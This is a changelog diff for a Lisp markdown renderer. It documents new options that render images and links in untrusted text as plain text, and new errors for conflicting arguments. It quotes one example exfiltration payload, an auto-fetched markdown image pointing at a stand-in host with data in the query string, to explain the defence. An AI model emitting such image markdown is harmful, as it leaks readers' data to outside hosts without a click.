@@ -1323,6 +1323,34 @@ its tag.
   posts where it did before. A host app that renders the chat parts in its own page, with its
   routes under a prefix, scoped to one conversation, or with its own `/api/message`, passes its
   route instead of mounting its handler at `/api/message`. `:action` must be a string.
+- **`hyperion/markdown:render` takes `:images` and `:links`, for text the app did not write**
+  (#1119, part one). `(render text :images nil :links :text)` renders each image as its alt text
+  and each link as its text, emitting no `img` element and no `href`. **The defaults are
+  unchanged**, so everything rendering trusted content behaves exactly as before.
+  **Why an app wants this for untrusted text.** An image is fetched as soon as it is rendered,
+  with no click, so a reply holding `![x](https://elsewhere.example/?d=...)` makes the reader's
+  machine send that request and whatever the URL carries with it; in a desktop webview with no
+  Content-Security-Policy nothing stops it. And in a desktop webview, following a link replaces
+  the app's own page with the linked one.
+  Both apply to an explicit link or image and to a reference link, and to relative and `mailto`
+  URLs as well as `http` and `https`. **An autolink needs neither option**: in the safe mode 3bmd
+  never builds one, because the angle brackets are escaped as text before it parses, so
+  `<https://host/>` already reaches the output as text — and the only mode that does build one is
+  `:allow-html t`, which these options refuse.
+  - **`render` now signals `hyperion/markdown:render-option-error` in two new cases**, both of
+    them a request it cannot honour:
+    `:allow-html t` passed together with `:images nil` or `:links :text`, and any value for
+    `:images` other than `t` or `nil`, or for `:links` other than `t` or `:text`. Nothing that
+    passes neither new argument can reach either signal, so no existing call changes. It is a
+    named condition rather than a plain `error` so an app can catch this misuse and nothing
+    else: these are mistakes in the call, not failures to render.
+  - `:allow-html t` with either mode is refused because raw HTML is not parsed into the tree
+    these options filter: an `img` or `href` written directly in the source survives them, so
+    `:images nil` would report no image while the output carried one. The two arguments also
+    describe opposite situations — `:allow-html t` is for content the app wrote, these modes for
+    content it did not.
+  - An unrecognised value is refused because the default is the permissive one, so a typo in a
+    security argument must not read as "render everything".
 
 - **hermes: how long a send waits is now hermes's own setting, `*send-connect-timeout*` and
   `*send-read-timeout*`, both 10 seconds** (#1077). Each provider also takes `:connect-timeout`
